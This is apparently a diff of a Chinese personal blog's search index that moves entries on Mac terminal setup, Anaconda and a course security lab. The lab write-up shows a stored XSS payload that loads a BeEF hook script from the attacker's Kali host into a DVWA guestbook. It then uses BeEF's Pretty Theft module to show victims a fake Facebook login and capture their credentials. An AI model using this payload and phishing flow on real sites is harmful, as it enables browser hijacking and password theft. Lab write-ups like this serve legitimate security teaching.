@@ -1,39 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>折腾---美观Mac下的终端</title>
-    <url>/2019/07/21/My-Terminal/</url>
-    <content><![CDATA[<p><del>讲道理</del>，Mac下的shell,嗯就是那个<strong>bash</strong>真的是太丑了，虽然可以修改背景色之类的还是觉得丑，所以就用<strong>iTerm2</strong>这个玩意代替他了，并且使用<strong>zsh</strong>代替了<strong>bash</strong>…<a id="more"></a>虽然<strong>bash</strong>的功能已经很强大，但对于以<del>懒惰</del>为美德的程序员来说，比如说我，bash的提示功能还不够强大，界面也不够酷炫，并非理想工具。而<strong>zsh</strong>的功能及其强大，只是配置过于复杂，起初只有极客在用，后来，有个穷极无聊的程序员可能实在是看不下去广大猿友使用单调的<strong>bash</strong>，于是他创建了一个名为<strong><em>oh-my-zsh</em></strong>的开源项目…</p>
-<p>自此，只需要简单的安装配置，我们也都可以用上<del>高档大气上档次，狂拽炫酷吊炸天的</del><strong><em>oh-my-zsh</em></strong>了。</p>
-<hr>
-<h3 id="一、安装iTerm2代替shell"><a href="#一、安装iTerm2代替shell" class="headerlink" title="一、安装iTerm2代替shell"></a>一、安装iTerm2代替shell</h3><h4 id="1-官方下载地址：https-www-iterm2-com"><a href="#1-官方下载地址：https-www-iterm2-com" class="headerlink" title="1. 官方下载地址：https://www.iterm2.com/"></a>1. <strong>官方下载地址：</strong><a href="https://www.iterm2.com/" target="_blank" rel="noopener">https://www.iterm2.com/</a></h4><p>   安装完成后，在/bin目录下会多出一个zsh的文件。Mac系统默认使用<strong>Bash</strong>作为终端，修改默认为<strong>zsh</strong>的命令如下：</p>
-<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure></p>
-<h4 id="2-替换背景图片"><a href="#2-替换背景图片" class="headerlink" title="2. 替换背景图片"></a>2. <strong>替换背景图片</strong></h4><p>   Iterm2-&gt;Preferences-&gt;Profiles-&gt;window-&gt;Background image</p>
-<p>   <img src="/2019/07/21/My-Terminal/change_background.png" alt="change_background"></p>
-<hr>
-<h3 id="二、安装oh-my-zsh"><a href="#二、安装oh-my-zsh" class="headerlink" title="二、安装oh-my-zsh"></a>二、安装oh-my-zsh</h3><p><strong>命令 2种方式：</strong></p>
-<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sh -c <span class="hljs-string">"<span class="hljs-variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure></p>
-<p>   或者</p>
-<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sh -c <span class="hljs-string">"<span class="hljs-variable">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure></p>
-<p>   用第二种方式需要wget，如果没有wget请安装</p>
-<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">brew install wget</span><br></pre></td></tr></table></figure></p>
-<p>   如果没有homebrew请自行百度安装这个强大的包管理工具，类似于centos或者ubuntu下的yum和apt-get</p>
-<p>   接下来只需要简单的配置，就可以享受oh-my-zsh的强大啦！</p>
-<hr>
-<h3 id="三、主题选择"><a href="#三、主题选择" class="headerlink" title="三、主题选择"></a>三、主题选择</h3><p>Oh-my-zsh有很多主题，具体请查看：<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/themes" target="_blank" rel="noopener">主题列表</a></p>
-<p>我选择的主题是<code>ys</code></p>
-<p><img src="/2019/07/21/My-Terminal/terminal.png" alt="terminal"></p>
-<p><del>请忽视我正在安装的东西…</del></p>
-<p>想要修改主题，打开~/.zshrc文件修改一下ZSH_THEME变量即可<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">open ~/.zshrc</span><br></pre></td></tr></table></figure><br>找到ZSH_THEME，将此变量值改为”ys”<br><figure class="highlight c hljs"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=<span class="hljs-string">"ys"</span></span><br></pre></td></tr></table></figure><br>最后更新修改后的配置文件<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></p>
-<hr>
-<h3 id="四、自动补全插件"><a href="#四、自动补全插件" class="headerlink" title="四、自动补全插件"></a>四、自动补全插件</h3><p>linux的命令有很多，想要全部记住是不可能的事情，<del>如果你是大佬当我没说</del>，这时候就需要我们的自动补全插件啦！<br>自动补全插件有很多种，一个是incr.zsh,下载此插件的命令为：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">wget http://mimosa-pudica.net/src/incr-0.2.zsh</span><br></pre></td></tr></table></figure><br>这个插件确实很屌，但是存在一些bug，比如很卡顿！对，你可以明显感受到卡顿，有点卡顿或许还能忍，但是在使用命令<code>git clone http</code> 对，我下一个要敲 <code>:</code>    可就在我敲下它的一瞬间，终端竟然卡住了，住了，了…… 应该是提示功能太过强大导致的吧…<br>所以我用了另一个插件代替它的功能，但是就没有第一个插件功能这么牛逼了，他的基本作用就是根据历史输入指令的记录即时的提示，这么看起来也算不上自动补全插件咯，但是也是可以提高一点效率的呀！它就是Autosuggestion<br>首先切换目录<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">cd</span> ~/.oh-my-zsh/custom/plugins/</span><br></pre></td></tr></table></figure><br>下载插件：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">git <span class="hljs-built_in">clone</span> git://github.com/zsh-users/zsh-autosuggestions <span class="hljs-variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><br>和修改主题需要修改配置文件一样，先打开配置文件~/.zshrc<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">open ~/.zshrc</span><br></pre></td></tr></table></figure><br>在最后添加一行，也就是把刚刚下载的插件的路径添加进去<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh</span><br></pre></td></tr></table></figure><br>保存后执行更新配置文件命令<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></p>
-<p>到这里就结束啦，开始我们的<del>装逼</del>之旅吧嘻嘻嘻！<br>最后贴一张现在的终端界面吧哈哈！<br><img src="/2019/07/21/My-Terminal/terminal_now.png" alt="Terminal_now"><br>为什么这张图这么大呢，哈哈因为我喜欢吧终端常开着放在几个桌面的最左端，有需要的时候直接切换过去，是不是贼方便呢嘻嘻！！</p>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Mac下命令行版本的Anaconda安装及常用命令</title>
     <url>/2019/12/03/anaconda-installformac/</url>
     <content><![CDATA[<p>简单记录一下在Mac下Anaconda安装的过程<a id="more"></a></p>
@@ -65,6 +32,39 @@
 <h4 id="conda管理"><a href="#conda管理" class="headerlink" title="conda管理"></a>conda管理</h4><h5 id="0-conda修改源"><a href="#0-conda修改源" class="headerlink" title="0. conda修改源"></a>0. conda修改源</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main</span><br><span class="line">conda config --<span class="hljs-built_in">set</span> show_channel_urls yes</span><br></pre></td></tr></table></figure><br>换回默认源<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda config --remove-key channels</span><br></pre></td></tr></table></figure><br>在执行conda config 命令的时候会在当前用户目录下创建 .condarc  文件，可以查看更换源前后该文件内容的变化。</p>
 <h5 id="1-检查conda版本"><a href="#1-检查conda版本" class="headerlink" title="1. 检查conda版本"></a>1. 检查conda版本</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda --version</span><br></pre></td></tr></table></figure></p>
 <h5 id="2-升级当前版本的conda"><a href="#2-升级当前版本的conda" class="headerlink" title="2. 升级当前版本的conda"></a>2. 升级当前版本的conda</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">conda update conda</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>折腾---美观Mac下的终端</title>
+    <url>/2019/07/21/My-Terminal/</url>
+    <content><![CDATA[<p><del>讲道理</del>，Mac下的shell,嗯就是那个<strong>bash</strong>真的是太丑了，虽然可以修改背景色之类的还是觉得丑，所以就用<strong>iTerm2</strong>这个玩意代替他了，并且使用<strong>zsh</strong>代替了<strong>bash</strong>…<a id="more"></a>虽然<strong>bash</strong>的功能已经很强大，但对于以<del>懒惰</del>为美德的程序员来说，比如说我，bash的提示功能还不够强大，界面也不够酷炫，并非理想工具。而<strong>zsh</strong>的功能及其强大，只是配置过于复杂，起初只有极客在用，后来，有个穷极无聊的程序员可能实在是看不下去广大猿友使用单调的<strong>bash</strong>，于是他创建了一个名为<strong><em>oh-my-zsh</em></strong>的开源项目…</p>
+<p>自此，只需要简单的安装配置，我们也都可以用上<del>高档大气上档次，狂拽炫酷吊炸天的</del><strong><em>oh-my-zsh</em></strong>了。</p>
+<hr>
+<h3 id="一、安装iTerm2代替shell"><a href="#一、安装iTerm2代替shell" class="headerlink" title="一、安装iTerm2代替shell"></a>一、安装iTerm2代替shell</h3><h4 id="1-官方下载地址：https-www-iterm2-com"><a href="#1-官方下载地址：https-www-iterm2-com" class="headerlink" title="1. 官方下载地址：https://www.iterm2.com/"></a>1. <strong>官方下载地址：</strong><a href="https://www.iterm2.com/" target="_blank" rel="noopener">https://www.iterm2.com/</a></h4><p>   安装完成后，在/bin目录下会多出一个zsh的文件。Mac系统默认使用<strong>Bash</strong>作为终端，修改默认为<strong>zsh</strong>的命令如下：</p>
+<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-替换背景图片"><a href="#2-替换背景图片" class="headerlink" title="2. 替换背景图片"></a>2. <strong>替换背景图片</strong></h4><p>   Iterm2-&gt;Preferences-&gt;Profiles-&gt;window-&gt;Background image</p>
+<p>   <img src="/2019/07/21/My-Terminal/change_background.png" alt="change_background"></p>
+<hr>
+<h3 id="二、安装oh-my-zsh"><a href="#二、安装oh-my-zsh" class="headerlink" title="二、安装oh-my-zsh"></a>二、安装oh-my-zsh</h3><p><strong>命令 2种方式：</strong></p>
+<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sh -c <span class="hljs-string">"<span class="hljs-variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure></p>
+<p>   或者</p>
+<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sh -c <span class="hljs-string">"<span class="hljs-variable">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure></p>
+<p>   用第二种方式需要wget，如果没有wget请安装</p>
+<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">brew install wget</span><br></pre></td></tr></table></figure></p>
+<p>   如果没有homebrew请自行百度安装这个强大的包管理工具，类似于centos或者ubuntu下的yum和apt-get</p>
+<p>   接下来只需要简单的配置，就可以享受oh-my-zsh的强大啦！</p>
+<hr>
+<h3 id="三、主题选择"><a href="#三、主题选择" class="headerlink" title="三、主题选择"></a>三、主题选择</h3><p>Oh-my-zsh有很多主题，具体请查看：<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/themes" target="_blank" rel="noopener">主题列表</a></p>
+<p>我选择的主题是<code>ys</code></p>
+<p><img src="/2019/07/21/My-Terminal/terminal.png" alt="terminal"></p>
+<p><del>请忽视我正在安装的东西…</del></p>
+<p>想要修改主题，打开~/.zshrc文件修改一下ZSH_THEME变量即可<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">open ~/.zshrc</span><br></pre></td></tr></table></figure><br>找到ZSH_THEME，将此变量值改为”ys”<br><figure class="highlight c hljs"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=<span class="hljs-string">"ys"</span></span><br></pre></td></tr></table></figure><br>最后更新修改后的配置文件<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="四、自动补全插件"><a href="#四、自动补全插件" class="headerlink" title="四、自动补全插件"></a>四、自动补全插件</h3><p>linux的命令有很多，想要全部记住是不可能的事情，<del>如果你是大佬当我没说</del>，这时候就需要我们的自动补全插件啦！<br>自动补全插件有很多种，一个是incr.zsh,下载此插件的命令为：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">wget http://mimosa-pudica.net/src/incr-0.2.zsh</span><br></pre></td></tr></table></figure><br>这个插件确实很屌，但是存在一些bug，比如很卡顿！对，你可以明显感受到卡顿，有点卡顿或许还能忍，但是在使用命令<code>git clone http</code> 对，我下一个要敲 <code>:</code>    可就在我敲下它的一瞬间，终端竟然卡住了，住了，了…… 应该是提示功能太过强大导致的吧…<br>所以我用了另一个插件代替它的功能，但是就没有第一个插件功能这么牛逼了，他的基本作用就是根据历史输入指令的记录即时的提示，这么看起来也算不上自动补全插件咯，但是也是可以提高一点效率的呀！它就是Autosuggestion<br>首先切换目录<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">cd</span> ~/.oh-my-zsh/custom/plugins/</span><br></pre></td></tr></table></figure><br>下载插件：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">git <span class="hljs-built_in">clone</span> git://github.com/zsh-users/zsh-autosuggestions <span class="hljs-variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><br>和修改主题需要修改配置文件一样，先打开配置文件~/.zshrc<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">open ~/.zshrc</span><br></pre></td></tr></table></figure><br>在最后添加一行，也就是把刚刚下载的插件的路径添加进去<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh</span><br></pre></td></tr></table></figure><br>保存后执行更新配置文件命令<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></p>
+<p>到这里就结束啦，开始我们的<del>装逼</del>之旅吧嘻嘻嘻！<br>最后贴一张现在的终端界面吧哈哈！<br><img src="/2019/07/21/My-Terminal/terminal_now.png" alt="Terminal_now"><br>为什么这张图这么大呢，哈哈因为我喜欢吧终端常开着放在几个桌面的最左端，有需要的时候直接切换过去，是不是贼方便呢嘻嘻！！</p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
@@ -203,6 +203,73 @@
       </categories>
   </entry>
   <entry>
+    <title>XSS结合Beef的社会工程学窃取密码实验</title>
+    <url>/2019/09/18/hacker-4/</url>
+    <content><![CDATA[<p>软件综合训练-终结篇<a id="more"></a></p>
+<p>不说废话了，直接切入正题……</p>
+<p>本次实验共用到老师给的kali和被攻击的win7系统。</p>
+<h3 id="1-kali上的配置"><a href="#1-kali上的配置" class="headerlink" title="1. kali上的配置"></a>1. <strong>kali上的配置</strong></h3><p>首先启动虚拟机，打开kali，直接点击kali桌面的这个图标，beef就会成功启动。</p>
+<p><img src="/2019/09/18/hacker-4/1.png" alt="1.png"></p>
+<p>你会看到弹出一个终端如下：</p>
+<p><img src="/2019/09/18/hacker-4/2.png" alt="2.png"></p>
+<p>终端上显示等待倒数5…4…3…2…1…秒，之后会弹出一个页面，即是我们要用到的beef，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/3.png" alt="3.png"></p>
+<p><code>Uername</code>和<code>Password</code>默认都为<code>beef</code>，如果你想修改这个用户名和密码，请去修改<code>/etc/beef-xss/config.yaml</code>该配置文件中用户名和密码字段值。</p>
+<p>我们输入用户名密码之后会显示如下页面：</p>
+<p><img src="/2019/09/18/hacker-4/4.png" alt="4.png"></p>
+<p>可以看到左边框中有两个文件夹，一个为Online Browsers，即在线主机；另一个为Offline Browsers，当然就是离线主机了。</p>
+<h3 id="2-win7上的配置"><a href="#2-win7上的配置" class="headerlink" title="2. win7上的配置"></a>2. <strong>win7上的配置</strong></h3><p>开启win7虚拟机，打开下图的这个软件：</p>
+<p><img src="/2019/09/18/hacker-4/5.png" alt="5.png"></p>
+<p>如果提示系统没有什么VC11之类的运行库，直接点击取消即可。</p>
+<p>之后点击启动，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/6.png" alt="6.png"></p>
+<p>到这里win7的配置基本完成，别忘了你的win7的ip地址，如果不记得了就在dos中输入ipconfig查看。</p>
+<p><img src="/2019/09/18/hacker-4/7.png" alt="7.png"></p>
+<p>如图所示，我的win7的ip地址为192.168.73.129</p>
+<h3 id="3-继续回到我们kali上"><a href="#3-继续回到我们kali上" class="headerlink" title="3. 继续回到我们kali上"></a>3. <strong>继续回到我们kali上</strong></h3><p>再开一个页面，在url搜索框中输入win7的ip地址，会打开一个新的的登陆框，</p>
+<p><img src="/2019/09/18/hacker-4/9.png" alt="9.png"></p>
+<p>用户名为admin，密码为password。登陆之后显示如下：</p>
+<p><img src="/2019/09/18/hacker-4/8.png" alt="8.png"></p>
+<p>让我们下滑到最后，有一个<strong>DVWA Security</strong>选项，从impossible改为low，不然永远成功不了，修改之后点击Submit提交。</p>
+<p>选择左边菜单栏的XSS(Stored)选项，Name字段值随便填写一个，比如我填写111，Message字段如下填写：</p>
+<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>你可以在这行代码前面添加一个输出，比如输出<code>hello</code>:</p>
+<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line">hello<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>当你复制我这行代码的时候，如果细心的话，你会发现，卧槽复制上去根本少了一些代码啊！</p>
+<p><img src="/2019/09/18/hacker-4/10.png" alt="10.png"></p>
+<p>原因是这个输入框的width有点短，让我们修改一下这个页面的html代码，将这个输入框的长度变长一些。</p>
+<p>按下F12，查看源码。</p>
+<p><img src="/2019/09/18/hacker-4/11.png" alt="11.png"></p>
+<p>让我们点击下面出现的这个框框的最左边的按钮，它可以让你点击原先页面的位置，以便与快速定位html元素。</p>
+<p><img src="/2019/09/18/hacker-4/12.png" alt="12.png"></p>
+<p>点击之后会发现，有一行html代码高亮显示，让我们右击编辑它，将maxlength字段值改为1000，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/13.png" alt="13.png"></p>
+<p>改完之后可以关掉这个框框了。</p>
+<p>你会发现原先Message中的内容不见，让我们重新粘贴一下复制的那行代码：</p>
+<p><img src="/2019/09/18/hacker-4/14.png" alt="14.png"></p>
+<p>啊！现在终于能复制全了，那就让我们点击下面的Sign Guestbook提交吧！</p>
+<p>是不是像下面这样显示呢？</p>
+<p><img src="/2019/09/18/hacker-4/15.png" alt="15.png"></p>
+<p>看它成功返回了hello这个结果。现在让我们回到之前beef那个页面，去看看那里有什么改变。</p>
+<p><img src="/2019/09/18/hacker-4/16.png" alt="16.png"></p>
+<p>你会发现在左边的Online Browsers文件夹中出现了一台主机，</p>
+<p>让我们点击它，出现下面这个页面：</p>
+<p><img src="/2019/09/18/hacker-4/17.png" alt="17.png"></p>
+<p>点击Commands，让我去社会工程学栏中寻找一个叫做Pretty Theft的脚本文件，如下所示：</p>
+<p><img src="/2019/09/18/hacker-4/18.png" alt="18.png"></p>
+<p>现在我们可以点击右下角的Execute了。</p>
+<p>让我们回到另一个打开的页面，你会发现弹出了一个类似于facebook的弹窗，如下显示：</p>
+<p><img src="/2019/09/18/hacker-4/19.png" alt="19.png"></p>
+<p>当我们在里面输入Email和密码之后点击log in，你所输入的信息就会到beef的后台数据库中。</p>
+<p>回到beef页面，你会在数据库中看到如下信息：</p>
+<p><img src="/2019/09/18/hacker-4/20.png" alt="20.png"></p>
+<p>到这里这个实验就结束了！</p>
+]]></content>
+      <categories>
+        <category>软件综合训练课程</category>
+      </categories>
+  </entry>
+  <entry>
     <title>DC4</title>
     <url>/2019/09/17/hacker-3/</url>
     <content><![CDATA[<p>软件综合训练-续<a id="more"></a></p>
@@ -304,73 +371,6 @@
 <p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo cat /root/flag.txt</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/09/17/hacker-3/23.png" alt="23.png"></p>
 <p>这样子就完成了！</p>
-]]></content>
-      <categories>
-        <category>软件综合训练课程</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>XSS结合Beef的社会工程学窃取密码实验</title>
-    <url>/2019/09/18/hacker-4/</url>
-    <content><![CDATA[<p>软件综合训练-终结篇<a id="more"></a></p>
-<p>不说废话了，直接切入正题……</p>
-<p>本次实验共用到老师给的kali和被攻击的win7系统。</p>
-<h3 id="1-kali上的配置"><a href="#1-kali上的配置" class="headerlink" title="1. kali上的配置"></a>1. <strong>kali上的配置</strong></h3><p>首先启动虚拟机，打开kali，直接点击kali桌面的这个图标，beef就会成功启动。</p>
-<p><img src="/2019/09/18/hacker-4/1.png" alt="1.png"></p>
-<p>你会看到弹出一个终端如下：</p>
-<p><img src="/2019/09/18/hacker-4/2.png" alt="2.png"></p>
-<p>终端上显示等待倒数5…4…3…2…1…秒，之后会弹出一个页面，即是我们要用到的beef，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/3.png" alt="3.png"></p>
-<p><code>Uername</code>和<code>Password</code>默认都为<code>beef</code>，如果你想修改这个用户名和密码，请去修改<code>/etc/beef-xss/config.yaml</code>该配置文件中用户名和密码字段值。</p>
-<p>我们输入用户名密码之后会显示如下页面：</p>
-<p><img src="/2019/09/18/hacker-4/4.png" alt="4.png"></p>
-<p>可以看到左边框中有两个文件夹，一个为Online Browsers，即在线主机；另一个为Offline Browsers，当然就是离线主机了。</p>
-<h3 id="2-win7上的配置"><a href="#2-win7上的配置" class="headerlink" title="2. win7上的配置"></a>2. <strong>win7上的配置</strong></h3><p>开启win7虚拟机，打开下图的这个软件：</p>
-<p><img src="/2019/09/18/hacker-4/5.png" alt="5.png"></p>
-<p>如果提示系统没有什么VC11之类的运行库，直接点击取消即可。</p>
-<p>之后点击启动，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/6.png" alt="6.png"></p>
-<p>到这里win7的配置基本完成，别忘了你的win7的ip地址，如果不记得了就在dos中输入ipconfig查看。</p>
-<p><img src="/2019/09/18/hacker-4/7.png" alt="7.png"></p>
-<p>如图所示，我的win7的ip地址为192.168.73.129</p>
-<h3 id="3-继续回到我们kali上"><a href="#3-继续回到我们kali上" class="headerlink" title="3. 继续回到我们kali上"></a>3. <strong>继续回到我们kali上</strong></h3><p>再开一个页面，在url搜索框中输入win7的ip地址，会打开一个新的的登陆框，</p>
-<p><img src="/2019/09/18/hacker-4/9.png" alt="9.png"></p>
-<p>用户名为admin，密码为password。登陆之后显示如下：</p>
-<p><img src="/2019/09/18/hacker-4/8.png" alt="8.png"></p>
-<p>让我们下滑到最后，有一个<strong>DVWA Security</strong>选项，从impossible改为low，不然永远成功不了，修改之后点击Submit提交。</p>
-<p>选择左边菜单栏的XSS(Stored)选项，Name字段值随便填写一个，比如我填写111，Message字段如下填写：</p>
-<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>你可以在这行代码前面添加一个输出，比如输出<code>hello</code>:</p>
-<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line">hello<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>当你复制我这行代码的时候，如果细心的话，你会发现，卧槽复制上去根本少了一些代码啊！</p>
-<p><img src="/2019/09/18/hacker-4/10.png" alt="10.png"></p>
-<p>原因是这个输入框的width有点短，让我们修改一下这个页面的html代码，将这个输入框的长度变长一些。</p>
-<p>按下F12，查看源码。</p>
-<p><img src="/2019/09/18/hacker-4/11.png" alt="11.png"></p>
-<p>让我们点击下面出现的这个框框的最左边的按钮，它可以让你点击原先页面的位置，以便与快速定位html元素。</p>
-<p><img src="/2019/09/18/hacker-4/12.png" alt="12.png"></p>
-<p>点击之后会发现，有一行html代码高亮显示，让我们右击编辑它，将maxlength字段值改为1000，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/13.png" alt="13.png"></p>
-<p>改完之后可以关掉这个框框了。</p>
-<p>你会发现原先Message中的内容不见，让我们重新粘贴一下复制的那行代码：</p>
-<p><img src="/2019/09/18/hacker-4/14.png" alt="14.png"></p>
-<p>啊！现在终于能复制全了，那就让我们点击下面的Sign Guestbook提交吧！</p>
-<p>是不是像下面这样显示呢？</p>
-<p><img src="/2019/09/18/hacker-4/15.png" alt="15.png"></p>
-<p>看它成功返回了hello这个结果。现在让我们回到之前beef那个页面，去看看那里有什么改变。</p>
-<p><img src="/2019/09/18/hacker-4/16.png" alt="16.png"></p>
-<p>你会发现在左边的Online Browsers文件夹中出现了一台主机，</p>
-<p>让我们点击它，出现下面这个页面：</p>
-<p><img src="/2019/09/18/hacker-4/17.png" alt="17.png"></p>
-<p>点击Commands，让我去社会工程学栏中寻找一个叫做Pretty Theft的脚本文件，如下所示：</p>
-<p><img src="/2019/09/18/hacker-4/18.png" alt="18.png"></p>
-<p>现在我们可以点击右下角的Execute了。</p>
-<p>让我们回到另一个打开的页面，你会发现弹出了一个类似于facebook的弹窗，如下显示：</p>
-<p><img src="/2019/09/18/hacker-4/19.png" alt="19.png"></p>
-<p>当我们在里面输入Email和密码之后点击log in，你所输入的信息就会到beef的后台数据库中。</p>
-<p>回到beef页面，你会在数据库中看到如下信息：</p>
-<p><img src="/2019/09/18/hacker-4/20.png" alt="20.png"></p>
-<p>到这里这个实验就结束了！</p>
 ]]></content>
       <categories>
         <category>软件综合训练课程</category>
@@ -485,20 +485,6 @@
       </categories>
   </entry>
   <entry>
-    <title>LeetCode DAY 4 (6)</title>
-    <url>/2020/01/13/leetcode-day4/</url>
-    <content><![CDATA[<p>嘿！大家好，懒狗又要开始更新Leetcode咯！<a id="more"></a></p>
-<h3 id="6-Z字形变换（中等）"><a href="#6-Z字形变换（中等）" class="headerlink" title="6. Z字形变换（中等）"></a>6. Z字形变换（中等）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>将一个给定字符串根据给定的行数，以从上往下、从左到右进行 Z 字形排列。<br>比如输入字符串为<code>&quot;LEETCODEISHIRING&quot;</code>行数为3时，排列如下：<br><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">L   C   I   R</span><br><span class="line">E T O E S I I G</span><br><span class="line">E   D   H   N</span><br></pre></td></tr></table></figure><br>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：<code>&quot;LCIRETOESIIGEDHN&quot;</code>。<br>请你实现这个将字符串进行指定行数变换的函数：<br><code>string convert(string s, int numRows);</code></p>
-<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="hljs-string">"LEETCODEISHIRING"</span>, numRows = 3</span><br><span class="line">输出: <span class="hljs-string">"LCIRETOESIIGEDHN"</span></span><br></pre></td></tr></table></figure></p>
-<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="hljs-string">"LEETCODEISHIRING"</span>, numRows = 4</span><br><span class="line">输出: <span class="hljs-string">"LDREOEIIECIHNTSG"</span></span><br><span class="line">解释:</span><br><span class="line"></span><br><span class="line">L     D     R</span><br><span class="line">E   O E   I I</span><br><span class="line">E C   I H   N</span><br><span class="line">T     S     G</span><br></pre></td></tr></table></figure></p>
